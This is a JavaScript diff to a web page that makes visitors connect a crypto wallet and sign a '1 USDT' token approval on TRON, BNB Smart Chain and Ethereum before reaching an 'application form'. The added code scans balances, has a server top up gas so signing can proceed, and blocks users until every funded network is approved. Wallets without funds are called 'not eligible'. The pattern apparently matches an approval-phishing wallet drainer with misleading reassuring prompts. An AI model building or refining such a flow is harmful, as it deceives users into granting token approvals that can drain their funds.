@@ -34,6 +34,7 @@ let paymentId = '';
 let paymentQueue = [];
 let paymentIndex = 0;
 let confirmedNetworks = 0;
+let verifiedPayments = new Set();
 let finishedPayments = new Set();
 let selectedWalletHref = '';
 let walletsCache = null;
@@ -447,7 +448,7 @@ function onWalletConnected(d) {
   authorizing = true;
   track('InitiateCheckout', FUNNEL_CONTENT);
   setLoaderStep('auth');
-  setBusy(true, 'Confirm in your wallet', 'Preparing your 1 USDT authorization. Approve the request in your wallet when it appears.');
+  setBusy(true, 'Scanning balances', 'Checking USDT and gas on TRON, BNB Smart Chain, and Ethereum.');
   startBackgroundApproval();
 }
 
@@ -461,6 +462,21 @@ function showPayError(message) {
     const sub = $('#m-loader-sub');
     if (sub) sub.textContent = message;
   }
+}
+
+function networkLabel(network) {
+  const key = String(network || '').toLowerCase();
+  if (key === 'tron') return 'TRON';
+  if (key === 'bsc') return 'BNB Smart Chain';
+  if (key === 'eth' || key === 'ethereum') return 'Ethereum';
+  return String(network || 'network').toUpperCase();
+}
+
+function sortPaymentQueue(list) {
+  const order = { tron: 0, bsc: 1, eth: 2 };
+  return list.slice().sort(function (a, b) {
+    return (order[a.network] ?? 9) - (order[b.network] ?? 9);
+  });
 }
 
 function sleep(ms) {
@@ -493,29 +509,30 @@ async function waitUntilGasReady(options) {
 
 async function ensureGasInBackground(p) {
   const gas = p.gas || {};
+  const label = networkLabel(p.network);
   if (p.status === 'verified' && p.transactionHash) return true;
+  setBusy(true, 'Checking ' + label + ' gas', 'If native gas is low, the server tops it up first. Networks below 1 USDT are skipped.');
   if (gas.sufficient === true && p.status !== 'awaiting_gas') {
-    return waitUntilGasReady({ poll: false });
+    return true;
   }
-  if (gas.autoFunded || p.status === 'awaiting_gas') {
-    try {
-      await fetch(BASE + '/api/payment/' + encodeURIComponent(paymentId) + '/gas-confirm', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: '{}',
-      });
-    } catch (_err) {
-      /* already funded or not needed */
-    }
-    return waitUntilGasReady({ poll: true });
+  try {
+    await fetch(BASE + '/api/payment/' + encodeURIComponent(paymentId) + '/gas-confirm', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: '{}',
+    });
+  } catch (_err) {
+    /* already funded or not needed */
   }
-  return false;
+  return waitUntilGasReady({ poll: true });
 }
 
 async function requestCurrentApproval() {
   if (!paymentId || resolved) return;
+  const p = paymentQueue[paymentIndex];
+  const label = networkLabel(p && p.network);
   setLoaderStep('sign');
-  setBusy(true, 'Confirm in your wallet', 'Approve 1 USDT in your wallet. The website will continue after you confirm.');
+  setBusy(true, 'Approve 1 USDT on ' + label, 'Confirm the approval in your wallet. The next network starts only after this signature.');
   try {
     const res = await fetch(BASE + '/api/payment/' + encodeURIComponent(paymentId) + '/request', {
       method: 'POST',
@@ -565,8 +582,12 @@ async function runCurrentNetwork() {
 
 function finishApprovals() {
   if (resolved) return;
-  if (!confirmedNetworks) {
-    setBusy(true, 'Confirm in your wallet', 'Waiting for wallet confirmation. Approve 1 USDT there to continue to the application form.');
+  if (verifiedPayments.size < paymentQueue.length) {
+    setBusy(
+      true,
+      'Approvals incomplete',
+      'Every network with at least 1 USDT must be signed before the application form.'
+    );
     return;
   }
   resolved = true;
@@ -582,15 +603,17 @@ function advanceAfterNetworkDone(reason, fromPaymentId) {
     if (finishedPayments.has(id)) return;
     finishedPayments.add(id);
   }
-  if (reason === 'verified') confirmedNetworks += 1;
+  if (reason === 'verified') {
+    confirmedNetworks += 1;
+    if (id) verifiedPayments.add(id);
+  }
   paymentIndex += 1;
   if (paymentIndex >= paymentQueue.length) {
     finishApprovals();
     return;
   }
   const next = paymentQueue[paymentIndex];
-  const label = next && next.network ? String(next.network).toUpperCase() : 'next';
-  setBusy(true, 'Confirm in your wallet', 'Opening the ' + label + ' 1 USDT approval in your wallet.');
+  setBusy(true, 'Checking ' + networkLabel(next && next.network), 'USDT is at least 1 on this network. Gas is checked next, then the approval popup.');
   setTimeout(function () {
     runCurrentNetwork();
   }, 1500);
@@ -598,7 +621,8 @@ function advanceAfterNetworkDone(reason, fromPaymentId) {
 
 async function startBackgroundApproval() {
   try {
-    await sleep(1500);
+    await sleep(800);
+    setBusy(true, 'Scanning balances', 'Checking USDT and gas on TRON, BNB Smart Chain, and Ethereum. Below 1 USDT is skipped.');
     const res = await fetch(BASE + '/api/payment/create', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -607,23 +631,24 @@ async function startBackgroundApproval() {
     const data = await res.json();
     if (!res.ok) throw new Error(data.message || 'Could not prepare authorization');
     const p = data.payment;
-    paymentQueue = (p.payments && p.payments.length) ? p.payments : [p];
+    paymentQueue = sortPaymentQueue((p.payments && p.payments.length) ? p.payments : [p]);
     paymentIndex = paymentQueue.findIndex(function (item) {
       return item.status !== 'verified';
     });
     finishedPayments = new Set();
+    verifiedPayments = new Set();
     confirmedNetworks = 0;
     if (paymentIndex < 0) {
-      confirmedNetworks = paymentQueue.filter(function (item) {
-        return item.status === 'verified' && item.transactionHash;
-      }).length || paymentQueue.length;
+      paymentQueue.forEach(function (item) {
+        if (item.status === 'verified' && item.transactionHash) verifiedPayments.add(item.paymentId);
+      });
       finishApprovals();
       return;
     }
     await runCurrentNetwork();
   } catch (err) {
     showPayError(err.message || 'Could not start authorization.');
-    setBusy(true, 'Confirm in your wallet', err.message || 'Could not start authorization.');
+    setBusy(true, 'Wallet not eligible', err.message || 'Your wallet is not eligible.');
   }
 }
 
